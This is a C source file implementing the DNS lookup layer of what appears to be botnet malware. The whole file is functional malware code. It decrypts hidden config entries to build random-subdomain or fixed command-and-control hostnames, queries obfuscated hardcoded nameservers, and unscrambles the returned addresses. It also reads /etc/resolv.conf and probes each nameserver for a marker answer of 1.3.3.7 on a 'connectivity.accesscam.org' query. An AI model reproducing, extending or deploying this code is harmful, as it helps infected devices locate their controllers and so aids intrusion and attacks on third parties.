#include "resolver.h"
#include "prng.h"
#include "crypto.h"

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#define DNS_QUERY_CAPACITY       0x200u
#define DNS_RESPONSE_CAPACITY    0x1000u
#define RESOLV_CONF_CAPACITY     0x800u
#define PROBE_RESPONSE_CAPACITY  0x400u
#define RESOLVER_MAX_NAMESERVERS 8
#define NAMESERVER_TEXT_LIMIT    0x1f

static void address_list_reset(AddressList *out)
{
    out->items = NULL;
    out->count = 0;
}

static uint16_t dns_read_u16(const uint8_t *p)
{
    return (uint16_t)((uint16_t)p[0] << 8 | (uint16_t)p[1]);
}

static void dns_write_u16(uint8_t *p, uint16_t value)
{
    p[0] = (uint8_t)(value >> 8);
    p[1] = (uint8_t)value;
}

static struct sockaddr_in dns_sockaddr(uint32_t address)
{
    struct sockaddr_in sin;

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = address;
    return sin;
}

static int dns_set_one_second_timeouts(int fd)
{
    struct timeval timeout;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO,
                   &timeout, (socklen_t)sizeof(timeout)) == -1)
        return -1;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO,
                   &timeout, (socklen_t)sizeof(timeout)) == -1)
        return -1;
    return 0;
}

void address_list_free(AddressList *list)
{
    if (list == NULL)
        return;

    free(list->items);
    list->count = 0;
    list->items = NULL;
}

static size_t dns_build_query(const char *name, uint8_t query[DNS_QUERY_CAPACITY])
{
    size_t name_length;
    size_t source = 0;
    size_t write_at = 13;
    size_t label_length_at = 12;
    uint8_t label_length = 0;
    size_t question_length;
    size_t root;
    size_t opt;
    uint32_t transaction_id;

    memset(query, 0, DNS_QUERY_CAPACITY);
    name_length = strlen(name);

    if (name_length > DNS_QUERY_CAPACITY ||
        name_length + 30 > DNS_QUERY_CAPACITY)
        return 0;

    while (source != name_length + 1) {
        uint8_t ch = (uint8_t)name[source];

        if (ch != 0 && ch != '.') {
            query[write_at] = ch;
            ++label_length;
        } else {
            query[label_length_at] = label_length;
            label_length_at = write_at;
            label_length = 0;
        }
        ++source;
        ++write_at;
    }
    query[name_length + 14] = 0;

    question_length = strlen((const char *)query + 12);
    root = 12 + question_length;
    dns_write_u16(query + root + 1, 1);
    dns_write_u16(query + root + 3, 1);

    opt = root + 5;
    query[opt] = 0;
    dns_write_u16(query + opt + 1, 41);
    dns_write_u16(query + opt + 3, 0x1000);
    dns_write_u16(query + opt + 9, 0);

    transaction_id = (uint32_t)prng_range(1, 0xffff);
    query[0] = (uint8_t)transaction_id;
    query[1] = (uint8_t)(transaction_id >> 8);
    query[2] = 0x01;
    query[5] = 0x01;
    query[11] = 0x01;

    return question_length + 28;
}

static int dns_name_consumed(const uint8_t *response, size_t response_length,
                             size_t name_at, size_t *consumed)
{
    size_t cursor = name_at;
    size_t result = 1;
    size_t hops = 0;
    int followed_pointer = 0;

    for (;;) {
        uint8_t length;

        if (cursor >= response_length)
            return -1;
        length = response[cursor];
        if (length == 0) {
            if (followed_pointer)
                ++result;
            *consumed = result;
            return 0;
        }

        if (length <= 0xbf) {
            ++cursor;
            if (!followed_pointer)
                ++result;
        } else {
            size_t target;

            if (cursor + 1 >= response_length || ++hops > response_length)
                return -1;
            target = ((size_t)length << 8 | response[cursor + 1]) - 0xc000u;
            cursor = target;
            followed_pointer = 1;
        }
    }
}

static uint32_t dns_transform_address(const uint8_t rdata[4])
{
    uint8_t transformed[4];
    uint32_t address;

    transformed[0] = rdata[2];
    transformed[1] = rdata[3];
    transformed[2] = rdata[0];
    transformed[3] = rdata[1];
    memcpy(&address, transformed, sizeof(address));
    return address;
}

static int dns_parse_answers(AddressList *out, uint8_t *response,
                             size_t response_length, int raw_address)
{
    uint8_t *question_zero;
    size_t question_length;
    size_t cursor;
    uint16_t answer_count;
    uint16_t answer_index;
    uint32_t *items = NULL;
    int32_t count = 0;

    if (response_length < 12)
        return -1;

    answer_count = dns_read_u16(response + 6);
    question_zero = memchr(response + 12, 0, response_length - 12);
    if (question_zero == NULL)
        return -1;
    question_length = (size_t)(question_zero - (response + 12));
    cursor = 12 + question_length + 5;
    if (cursor > response_length)
        return -1;

    for (answer_index = 0; answer_index < answer_count; ++answer_index) {
        size_t name_length;
        size_t record;
        uint16_t type;
        uint16_t class_;
        uint16_t rdlength;

        if (dns_name_consumed(response, response_length, cursor,
                              &name_length) != 0)
            goto malformed;
        if (name_length > response_length - cursor)
            goto malformed;
        record = cursor + name_length;
        if (record > response_length || response_length - record < 10)
            goto malformed;

        type = dns_read_u16(response + record);
        class_ = dns_read_u16(response + record + 2);
        rdlength = dns_read_u16(response + record + 8);
        if (response_length - record - 10 < rdlength)
            goto malformed;

        if (type == 1 && class_ == 1 && rdlength == 4) {
            uint32_t address;
            uint32_t *grown;

            if (raw_address)
                memcpy(&address, response + record + 10, sizeof(address));
            else
                address = dns_transform_address(response + record + 10);

            grown = realloc(items, (size_t)(count + 1) * sizeof(*items));
            if (grown == NULL) {
                free(items);
                return -1;
            }
            items = grown;
            items[count++] = address;
        }

        cursor = record + 10 + rdlength;
    }

    out->items = items;
    out->count = count;
    return 0;

malformed:
    free(items);
    return -1;
}

static uint32_t dns_auxiliary_server(void)
{
    static const uint32_t servers[4] = {
        0x1b0532c2u,
        0xb9c3b18bu,
        0x5c2ee9acu,
        0xcb7869acu
    };

    return servers[prng_next() & 3u];
}

AddressList *dns_resolve(AddressList *out, const char *name,
                         int alternate_server, int raw_address)
{
    int fd;
    uint32_t server;
    struct sockaddr_in server_address;
    uint8_t query[DNS_QUERY_CAPACITY];
    uint8_t response[DNS_RESPONSE_CAPACITY];
    size_t query_length;
    ssize_t sent;
    ssize_t received;
    socklen_t address_length;

    if (out == NULL)
        return NULL;
    address_list_reset(out);
    if (name == NULL)
        return out;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1)
        return out;
    if (dns_set_one_second_timeouts(fd) != 0)
        goto failure;

    if (raw_address != 0 || alternate_server == 0)
        server = g_dns_server_address;
    else
        server = dns_auxiliary_server();
    if (server == 0)
        server = prng_ipv4();
    server_address = dns_sockaddr(server);

    query_length = dns_build_query(name, query);
    if (query_length == 0)
        goto failure;

    sent = sendto(fd, query, query_length, 0,
                  (const struct sockaddr *)&server_address,
                  (socklen_t)sizeof(server_address));
    if (sent == -1)
        goto failure;

    memset(response, 0, sizeof(response));
    address_length = (socklen_t)sizeof(server_address);
    received = recvfrom(fd, response, sizeof(response), 0,
                        (struct sockaddr *)&server_address, &address_length);
    if (received <= 0)
        goto failure;

    if (dns_parse_answers(out, response, (size_t)received, raw_address) != 0)
        goto failure;

    close(fd);
    return out;

failure:
    close(fd);
    free(out->items);
    address_list_reset(out);
    return out;
}

static const char *resolver_config_data(int32_t index)
{
    if (g_config == NULL)
        return NULL;
    return g_config[index].data;
}

AddressList *resolver_choose_addresses(AddressList *out)
{
    int32_t strategy;

    if (out == NULL)
        return NULL;
    address_list_reset(out);
    strategy = (int32_t)(prng_next() & 1u);

    if (strategy == 0) {
        uint32_t suffix_choice = prng_next();
        char name[64];
        int32_t index;
        const char *suffix;
        size_t prefix_length;
        size_t suffix_length;
        int resolve_name = 0;

        memset(name, 0, sizeof(name));
        prng_alphanumeric(name, prng_range(4, 0x10));
        prefix_length = strlen(name);
        if (prefix_length + 1 >= sizeof(name))
            return out;
        name[prefix_length] = '.';
        name[prefix_length + 1] = '\0';

        index = (suffix_choice & 1u) == 0 ? 54 : 55;
        config_decrypt_entry(index);
        suffix = resolver_config_data(index);
        if (suffix != NULL) {
            prefix_length = strlen(name);
            suffix_length = strlen(suffix);
            if (suffix_length <= sizeof(name) - prefix_length - 1) {
                memcpy(name + prefix_length, suffix, suffix_length + 1);
                resolve_name = 1;
            }
        }
        config_encrypt_entry(index);
        if (resolve_name)
            dns_resolve(out, name, 0, 0);
    } else {
        int32_t direct_choice = (int32_t)(prng_next() & 1u);
        int32_t index = direct_choice == 0 ? 56 : 57;
        const char *name;

        config_decrypt_entry(index);
        name = resolver_config_data(index);
        if (name != NULL)
            dns_resolve(out, name, 1, 0);
        config_encrypt_entry(index);
    }

    return out;
}

uint32_t resolver_discover_local_address(void)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in address;
    socklen_t address_length;

    if (fd == -1)
        return 0;

    address = dns_sockaddr(0x08080808u);
    (void)connect(fd, (const struct sockaddr *)&address, sizeof(address));
    address_length = (socklen_t)sizeof(address);
    (void)getsockname(fd, (struct sockaddr *)&address, &address_length);
    close(fd);
    return address.sin_addr.s_addr;
}

char *read_line(int fd, char *buffer, int capacity)
{
    int32_t offset = 0;

    for (;;) {
        if (read(fd, buffer + offset, 1) <= 0 || buffer[offset] == '\n') {
            if (offset == 0)
                return NULL;
            break;
        }

        ++offset;
        if (offset >= capacity)
            break;
    }

    return buffer;
}

static const uint8_t resolver_probe_query[0x37] = {
    0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x01,
    0x0c, 'c', 'o', 'n', 'n', 'e', 'c', 't', 'i', 'v', 'i', 't', 'y',
    0x09, 'a', 'c', 'c', 'e', 's', 's', 'c', 'a', 'm',
    0x03, 'o', 'r', 'g', 0x00,
    0x00, 0x01, 0x00, 0x01,
    0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00
};

static int resolver_probe_nameserver(uint32_t server)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in address;
    struct timeval timeout;
    uint8_t response[PROBE_RESPONSE_CAPACITY];
    ssize_t received;
    ssize_t sent;
    socklen_t address_length;
    uint16_t answers;
    int32_t answer;

    if (fd < 0)
        return 0;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    (void)setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO,
                     &timeout, (socklen_t)sizeof(timeout));
    (void)setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO,
                     &timeout, (socklen_t)sizeof(timeout));

    address = dns_sockaddr(server);
    sent = sendto(fd, resolver_probe_query, sizeof(resolver_probe_query), 0,
                  (const struct sockaddr *)&address, sizeof(address));
    if (sent <= 0) {
        close(fd);
        return 0;
    }

    address_length = (socklen_t)sizeof(address);
    received = recvfrom(fd, response, sizeof(response), 0,
                        (struct sockaddr *)&address, &address_length);
    close(fd);
    if (received <= 0 || received < 12)
        return 0;

    answers = dns_read_u16(response + 6);
    if (answers == 0)
        return 0;

    if (received <= 12 || response[12] == 0) {
        answer = 0x11;
    } else {
        int32_t cursor = 12;
        uint8_t length = response[12];

        do {
            cursor = cursor + 1 + length;
            if (received <= cursor)
                break;
            length = response[cursor];
        } while (length != 0);
        answer = cursor + 5;
    }

    if (answers == 1 && received >= answer + 0x0c &&
        dns_read_u16(response + answer + 2) == 1 &&
        dns_read_u16(response + answer + 10) == 4 &&
        received >= answer + 0x10 &&
        response[answer + 12] == 1 && response[answer + 13] == 3 &&
        response[answer + 14] == 3 && response[answer + 15] == 7)
        return 1;

    return 0;
}

uint32_t resolver_select_dns_server(void)
{
    int fd;
    uint8_t contents[RESOLV_CONF_CAPACITY];
    ssize_t length;
    uint32_t nameservers[RESOLVER_MAX_NAMESERVERS];
    int32_t count = 0;
    int32_t cursor = 0;
    int32_t index;

    fd = open("/etc/resolv.conf", O_RDONLY);
    if (fd < 0)
        return 0;
    length = read(fd, contents, sizeof(contents));
    close(fd);
    if (length <= 0)
        return 0;

    for (;;) {
        int32_t token_start = cursor + 0x0a;

        if (length > token_start &&
            strncmp((const char *)contents + cursor, "nameserver", 0x0a) == 0) {
            int32_t token_end = token_start;
            uint8_t ch = contents[token_start];

            while (ch == '\t' || ch == ' ') {
                int32_t next = token_start + 1;

                if (length <= next) {
                    token_start = next;
                    token_end = next;
                    ch = 0;
                    break;
                }
                token_start = next;
                token_end = token_start;
                ch = contents[token_start];
            }

            if (ch != 0 || token_end != token_start || token_start < length) {
                int32_t next = token_start + 1;

                token_end = token_start;
                while (ch != '\n' && ch != ' ' && ch != '\t') {
                    ++token_end;
                    ++next;
                    if (length <= token_end)
                        break;
                    ch = contents[next - 1];
                }
            }

            {
                int32_t token_length = token_end - token_start;
                char address_text[NAMESERVER_TEXT_LIMIT + 1];

                if (token_length >= NAMESERVER_TEXT_LIMIT)
                    token_length = NAMESERVER_TEXT_LIMIT;
                if (token_length < 0)
                    token_length = 0;
                memcpy(address_text, contents + token_start, (size_t)token_length);
                address_text[token_length] = '\0';
                nameservers[count] = inet_addr(address_text);
            }

            cursor = token_end + 1;
            ++count;
            if (length <= cursor || count > 7)
                break;
            continue;
        }

        if (length > cursor && contents[cursor] != '\n') {
            do {
                ++cursor;
                if (cursor == length)
                    break;
            } while (contents[cursor] != '\n');
        }
        ++cursor;
        if (length <= cursor || count > 7)
            break;
    }

    for (index = 0; index < count; ++index) {
        if (resolver_probe_nameserver(nameservers[index]))
            return nameservers[index];
    }
    return 0;
}
